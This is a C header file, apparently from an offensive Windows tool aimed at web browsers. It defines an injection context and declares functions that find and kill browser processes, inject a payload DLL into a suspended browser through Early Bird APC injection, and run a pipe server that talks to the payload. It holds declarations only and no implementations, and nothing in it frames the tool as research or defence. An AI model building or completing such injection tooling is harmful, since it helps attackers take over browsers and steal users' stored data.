#ifndef INJECTOR_H
#define INJECTOR_H

#include <windows.h>
#include "../abe/elevator.h"

typedef struct _INJECT_CTX {
    BROWSER_ID  browser;
    char        output_dir[MAX_PATH];
    char        chrome_path[MAX_PATH];
    char        dll_temp_path[MAX_PATH];
    HANDLE      hProcess;
    HANDLE      hThread;
    DWORD       pid;
} INJECT_CTX;

// Find browser executable path
BOOL find_browser_path(BROWSER_ID browser, char* out_path, DWORD max_len);

// Kill existing browser processes
BOOL kill_browser(const char* exe_name);

// Create suspended browser process, inject payload via Early Bird APC
BOOL inject_payload(INJECT_CTX* ctx, PBYTE payload_dll, DWORD payload_size);

// Run the pipe server, communicate with payload, wait for completion
BOOL run_pipe_server(INJECT_CTX* ctx);

#endif
